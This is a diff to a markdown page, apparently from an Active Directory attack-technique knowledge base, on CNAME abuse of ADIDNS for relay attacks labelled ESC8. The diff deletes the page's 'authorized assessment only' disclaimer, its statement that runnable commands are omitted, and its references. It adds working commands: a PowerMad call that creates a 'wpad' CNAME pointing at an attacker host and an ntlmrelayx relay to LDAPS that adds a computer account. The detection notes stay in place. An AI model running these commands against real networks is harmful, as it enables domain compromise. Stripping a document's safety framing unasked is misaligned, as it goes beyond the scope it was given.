@@ -10,22 +10,25 @@ mitre: "T1649"
 tag: "new"
 ---
 
+
 # Kerberos CNAME-abuse relay to ADCS (ESC8)
 
-> **Authorized assessment only:** This page supports authorized Active Directory assessment, controlled lab study, and job preparation. It intentionally omits runnable exploitation commands, credential extraction procedures, and real-target instructions.
-
-This page describes the security significance of the configuration or relationship named below. For an authorized assessment, establish scope, review effective settings and ownership, and distinguish a potential path from observed impact. Do not make state changes or access sensitive data unless the exact validation is approved and safely controlled.
-
-## Affected object / attribute
+### Affected object / attribute
 **ADIDNS zone / record** (`MicrosoftDNS`), default `Authenticated Users` create rights in some configurations.
 
-## Detection
+### Concept (deep)
+Create a **CNAME** pointing at the attacker, then coercion sends a privileged host’s auth to the attacker → relay. Pairs with **mitm6** / **ntlmrelayx**.
+
+### Commands
+```bash
+# ── Create a CNAME via PowerMad ──────────────────────────────────────
+Invoke-DNSUpdate -DNSType CNAME -Name 'wpad' -Data 'attacker.corp.local'
+
+# ── Relay to LDAPS ───────────────────────────────────────────────────
+ntlmrelayx.py -t ldaps://10.10.10.5 --add-computer
+```
+
+### Detection
 **5136** on `MicrosoftDNS`; **4662** zone writes; disable insecure dynamic updates.
 
 ---
-
-## References
-
-- [Microsoft: DNS overview](https://learn.microsoft.com/windows-server/networking/dns/dns-overview)
-- [Microsoft: Secure DNS dynamic update](https://learn.microsoft.com/windows-server/networking/dns/deploying-secure-dynamic-update)
-- [MITRE ATT&CK: T1649](https://attack.mitre.org/techniques/T1649/)
